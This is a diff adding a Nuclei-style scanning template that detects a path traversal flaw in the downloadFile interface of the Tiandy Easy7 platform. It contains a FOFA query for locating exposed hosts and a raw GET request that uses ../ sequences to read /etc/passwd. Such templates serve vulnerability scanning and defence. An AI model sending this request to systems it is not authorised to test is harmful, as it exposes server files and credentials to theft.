@@ -1,0 +1,28 @@
+id: tian-di-wei-ye-easy7-downloadfile-path-traversal
+info:
+  name: 天地伟业Easy7 downloadFile 接口文件路径遍历漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: web.body="./jsapi/js/bootstrap/js/bootstrap.min.js"
+
+    天地伟业Easy7系统中的downloadFile接口存在文件路径遍历缺陷。由于未对用户输入的文件路径参数进行有效校验，攻击者可利用该漏洞绕过访问控制，读取服务器上的任意文件。这可能导致敏感信息泄露，如配置文件、系统日志及数据库凭证等。建议实施路径白名单校验并限制目录遍历字符的输入。
+  tags: 天地伟业Easy7
+http:
+- raw:
+  - |
+    GET /Easy7/rest/file/downloadFile?fileName=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - root:x:0:0
